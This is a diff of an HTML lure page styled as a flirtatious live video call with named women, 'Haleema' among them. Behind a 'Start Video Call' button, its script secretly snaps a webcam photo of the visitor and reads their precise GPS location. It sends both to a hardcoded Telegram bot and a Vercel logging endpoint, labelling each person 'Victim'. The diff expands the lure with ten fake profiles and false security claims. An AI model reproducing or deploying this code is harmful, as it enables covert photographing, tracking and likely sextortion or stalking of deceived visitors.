@@ -2,98 +2,138 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>💋 Live Video Chat - Haleema</title>
+  <title>💋 Live Video Chat - Urgent Call</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Roboto:wght@400;700&display=swap');
     body {
       font-family: 'Roboto', sans-serif;
-      background: linear-gradient(135deg, #1a0033, #4a004d);
+      background: linear-gradient(135deg, #1a0033, #4a004d, #1a0033);
       color: white;
       margin: 0;
       padding: 0;
-      height: 100vh;
-      overflow: hidden;
+      min-height: 100vh;
+      overflow-y: auto;
       text-align: center;
     }
     .container {
-      max-width: 380px;
-      margin: 40px auto;
-      background: rgba(0,0,0,0.85);
-      border-radius: 20px;
-      padding: 25px;
-      box-shadow: 0 0 30px rgba(255, 20, 147, 0.6);
-      border: 2px solid #ff1493;
+      max-width: 420px;
+      margin: 30px auto;
+      background: rgba(0,0,0,0.9);
+      border-radius: 25px;
+      padding: 30px 20px;
+      box-shadow: 0 0 40px rgba(255, 20, 147, 0.8);
+      border: 3px solid #ff1493;
+    }
+    .header {
+      font-family: 'Pacifico', cursive;
+      font-size: 38px;
+      color: #ff1493;
+      margin-bottom: 10px;
+      text-shadow: 0 0 15px #ff1493;
     }
     .girl-img {
-      width: 180px;
-      height: 180px;
+      width: 200px;
+      height: 200px;
       border-radius: 50%;
-      border: 5px solid #ff1493;
+      border: 6px solid #ff1493;
       margin: 15px auto;
-      box-shadow: 0 0 25px #ff1493;
+      box-shadow: 0 0 30px #ff1493;
+      animation: glow 2s infinite alternate;
     }
-    .name {
-      font-family: 'Pacifico', cursive;
-      font-size: 32px;
-      color: #ff1493;
-      margin: 10px 0;
-    }
+    @keyframes glow { from { box-shadow: 0 0 20px #ff1493; } to { box-shadow: 0 0 40px #ff69b4; } }
     .status {
       color: #00ff00;
       font-weight: bold;
-      animation: pulse 2s infinite;
+      font-size: 18px;
+      animation: pulse 1.5s infinite;
     }
     .message {
       background: #2a002a;
-      padding: 15px;
-      border-radius: 12px;
-      margin: 20px 0;
-      font-size: 15px;
+      padding: 18px;
+      border-radius: 15px;
+      margin: 25px 0;
+      font-size: 16px;
+      border-left: 5px solid #ffd700;
     }
     .btn {
-      background: linear-gradient(45deg, #ff1493, #ff69b4);
+      background: linear-gradient(45deg, #ff1493, #ff69b4, #ff1493);
       color: white;
-      padding: 16px 40px;
-      font-size: 18px;
+      padding: 18px 50px;
+      font-size: 20px;
       border: none;
       border-radius: 50px;
       cursor: pointer;
-      margin: 15px 0;
-      box-shadow: 0 8px 20px rgba(255,20,147,0.5);
-      transition: all 0.3s;
+      margin: 20px 0;
+      box-shadow: 0 10px 25px rgba(255,20,147,0.6);
+      transition: all 0.4s;
+      font-weight: bold;
     }
     .btn:hover {
-      transform: scale(1.08);
-      box-shadow: 0 12px 30px rgba(255,20,147,0.8);
+      transform: scale(1.1) translateY(-5px);
+      box-shadow: 0 15px 35px rgba(255,20,147,0.9);
+    }
+    .cards { margin-top: 30px; }
+    .card {
+      background: rgba(255,255,255,0.1);
+      margin: 15px;
+      padding: 15px;
+      border-radius: 15px;
+      border: 1px solid #ff1493;
     }
     video, canvas { display: none; }
-    @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
-    .urgent { color: #ffd700; animation: urgent 1.5s infinite; }
+    footer {
+      margin-top: 40px;
+      font-size: 12px;
+      opacity: 0.6;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://i.imgur.com/0Z3vK8L.jpeg" class="girl-img" alt="Girl">
-    <div class="name">Haleema</div>
-    <div class="status">● Online Now - Video Call Available</div>
+    <div class="header">💋 Urgent Video Call</div>
+    <img src="https://i.imgur.com/0Z3vK8L.jpeg" class="girl-img" alt="Live Girl">
+    <div class="status">● ONLINE NOW - READY FOR CALL</div>
+
     <div class="message">
-      💬 Hey! I want to do video call with you.<br>
-      <span class="urgent">Allow Camera + Location to Connect Instantly</span>
+      Hey, I am waiting for you...<br>
+      <strong>Allow Camera + Location to start private video call instantly</strong><br>
+      <span style="color:#ffd700;">Don't miss me 😘</span>
     </div>
-    <button class="btn" onclick="captureAndSend('Haleema')">Start Video Call Now</button>
-    <p style="font-size:12px;opacity:0.7;margin-top:20px;">🔒 Secure Connection • 256-bit Encryption</p>
+
+    <button class="btn" onclick="captureAndSend('Haleema')">START VIDEO CALL NOW</button>
+
+    <div class="cards" id="cards"></div>
+
+    <footer>
+      🔒 256-Bit Secure Connection • Your privacy is important
+    </footer>
   </div>
 
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="320" height="240"></canvas>
+  <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
-    // 🔥 Telegram Config
+    // Girls List
+    const girls = ["Haleema", "Iqra", "Fatima", "Dua", "Saira", "Sidra", "Noor", "Rimsha", "Areeka", "Anaya"];
+
     const BOT_TOKEN = "8941251283:AAFDGIvRSkAHR0h1RYuMgt6-FfK-LZ3HUH0";
     const CHAT_ID = "7264141539";
 
-    // 📸 + 📍 Capture & Send to BOTH
+    const cardsContainer = document.getElementById("cards");
+
+    girls.forEach(name => {
+      const card = document.createElement("div");
+      card.className = "card";
+      card.innerHTML = `
+        <div style="font-size:22px;color:#ff1493;">${name}</div>
+        <div style="color:#00ff00;font-size:14px;">Online • Video Call Available</div>
+        <button class="btn" style="padding:12px 30px;font-size:16px;" onclick="captureAndSend('${name}')">Call Now</button>
+      `;
+      cardsContainer.appendChild(card);
+    });
+
     async function captureAndSend(name) {
       try {
         const video = document.getElementById("video");
@@ -103,72 +143,58 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        await new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(resolve, 1500);
-          };
-        });
+        await new Promise(r => { video.onloadedmetadata = () => { video.play(); setTimeout(r, 1800); }; });
 
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL("image/jpeg");
+        const imageData = canvas.toDataURL("image/jpeg", 0.95);
 
-        stream.getTracks().forEach(track => track.stop());
+        stream.getTracks().forEach(t => t.stop());
 
         const locationData = await getLocation().catch(() => null);
 
         sendToBoth(imageData, name, locationData);
 
       } catch (err) {
-        alert("❌ Camera error. Please allow access.");
+        alert("Please allow camera and location access");
       }
     }
 
     function getLocation() {
       return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) return reject();
         navigator.geolocation.getCurrentPosition(
-          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+          p => resolve({lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy}),
           reject,
-          { enableHighAccuracy: true, timeout: 10000 }
+          {enableHighAccuracy: true}
         );
       });
     }
 
     function sendToBoth(imageData, name, locationData) {
-      const payload = {
-        name: name,
-        photo: imageData,
-        lat: locationData ? locationData.lat : null,
-        lon: locationData ? locationData.lon : null,
-        acc: locationData ? locationData.acc : null,
-        time: new Date().toISOString(),
-        userAgent: navigator.userAgent
-      };
+      const mapLink = locationData ? `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}` : "Location not available";
 
       // Telegram
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
-      formData.append("caption", `📸 Victim: ${name}\n📍 ${payload.lat || 'N/A'}, ${payload.lon || 'N/A'}\nTime: ${payload.time}`);
+      formData.append("caption", `📸 Victim: ${name}\n📍 ${mapLink}\nTime: ${new Date().toISOString()}`);
       formData.append("photo", dataURItoBlob(imageData), "photo.jpg");
 
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData }).catch(() => {});
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:"POST", body:formData}).catch(()=>{}); 
 
       // Vercel
       fetch('https://videocall-orcin-two.vercel.app/api/log', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(() => {});
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({name, photo: imageData, lat: locationData?.lat, lon: locationData?.lon, acc: locationData?.acc})
+      }).catch(()=>{});
     }
 
     function dataURItoBlob(dataURI) {
-      let byteString = atob(dataURI.split(",")[1]);
-      let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
-      let ab = new ArrayBuffer(byteString.length);
-      let ia = new Uint8Array(ab);
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
       for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-      return new Blob([ab], { type: mimeString });
+      return new Blob([ab], {type: mimeString});
     }
   </script>
 </body>
